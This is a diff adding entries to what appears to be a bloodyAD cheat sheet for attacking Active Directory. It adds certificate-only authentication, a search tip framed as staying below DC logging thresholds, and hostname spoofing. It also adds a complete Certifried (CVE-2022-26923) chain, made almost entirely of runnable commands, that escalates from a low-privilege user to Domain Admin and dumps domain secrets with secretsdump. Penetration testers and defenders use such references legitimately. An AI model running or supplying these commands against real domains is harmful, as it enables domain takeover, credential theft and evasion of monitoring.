@@ -23,6 +23,9 @@ bloodyAD -k ccache=/tmp/admin.ccache -d $DOMAIN --host $DC_HOST [cmd]
 # Certificate-based auth (key and cert from Certipy/pywhisker output)
 bloodyAD -c /tmp/priv.key:/tmp/cert.pem -d $DOMAIN --host $DC_HOST [cmd]
 
+# Certificate-only auth (no private key; for Schannel/PKINIT-unavailable scenarios)
+bloodyAD -c ":$USER.pem" -u $USER -d $DOMAIN --host $DC_HOST [cmd]
+
 # Force LDAPS (port 636); required when targeting read-only DCs or strict configs
 bloodyAD -s -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST [cmd]
 
@@ -66,6 +69,10 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --include
 ```bash wrap
 # Read all attributes of a user
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object svc_backup
+
+# Check machine account quota before RBCD or Certifried attacks
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
 
 # Read userAccountControl to check account flags (disabled, no-preauth, etc.)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
@@ -113,6 +120,12 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 # Find all enabled user accounts
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   get search --filter '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+  --attr sAMAccountName
+
+# Scope the search base to a specific OU to stay below DC-side logging thresholds
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get search --base "CN=Users,DC=$DOMAIN,DC=local" \
+  --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
   --attr sAMAccountName
 ```
 
@@ -269,6 +282,10 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 # Write any attribute by name and value
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set object $TARGET description -v 'modified'
+
+# Spoof a computer's DNS hostname to match a DC (Certifried / CVE-2022-26923 prerequisite)
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object 'ATTACKER$' dNSHostName -v "DC01.$DOMAIN"
 ```
 
 ## Delegation Abuse
@@ -402,6 +419,46 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 # Remove a DNS record after use
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   remove dnsRecord attacker-host $LHOST
+```
+
+## Certifried (CVE-2022-26923)
+
+Certifried abuses the fact that the AD CS Machine template uses `dNSHostName` as the certificate subject rather than the machine SID. A low-priv user with `ms-DS-MachineAccountQuota > 0` can create a computer account, set its `dNSHostName` to match a DC, request a Machine cert, and use that cert to set up RBCD against the DC.
+
+```bash wrap
+# Step 1: Confirm you can create machine accounts
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+
+# Step 2: Create a computer account
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  add computer 'attacker$' $COMP_PASS
+
+# Step 3: Set its dNSHostName to match the DC
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object 'attacker$' dNSHostName -v "DC01.$DOMAIN"
+
+# Step 4: Request a Machine cert as the spoofed computer (via Certipy)
+certipy req -u 'attacker$'@$DOMAIN -p $COMP_PASS \
+  -dc-ip $DC_IP -target $CA_HOST -ca $CA -template Machine
+
+# Step 5: Use the cert to authenticate and retrieve the DC's NT hash
+certipy auth -pfx dc01.pfx -dc-ip $DC_IP
+# If PKINIT unavailable, convert to PEM and auth via Schannel:
+certipy cert -pfx dc01.pfx -out dc01.pem
+bloodyAD -c ":dc01.pem" -u 'DC01$' -d $DOMAIN --host $DC_HOST \
+  get object "DC=$DOMAIN,DC=local" --attr msDS-Behavior-Version
+
+# Step 6: Set RBCD on the DC to impersonate DA via S4U2Proxy
+bloodyAD -c ":dc01.pem" -u 'DC01$' -d $DOMAIN --host $DC_HOST \
+  add rbcd 'DC01$' 'attacker$'
+
+getST.py $DOMAIN/'attacker$':$COMP_PASS \
+  -spn cifs/DC01.$DOMAIN \
+  -impersonate Administrator \
+  -dc-ip $DC_IP
+export KRB5CCNAME="Administrator@cifs_DC01.$DOMAIN@${DOMAIN^^}.ccache"
+secretsdump.py -k -no-pass Administrator@DC01.$DOMAIN
 ```
 
 ## Recycle Bin & Tombstone Reanimation
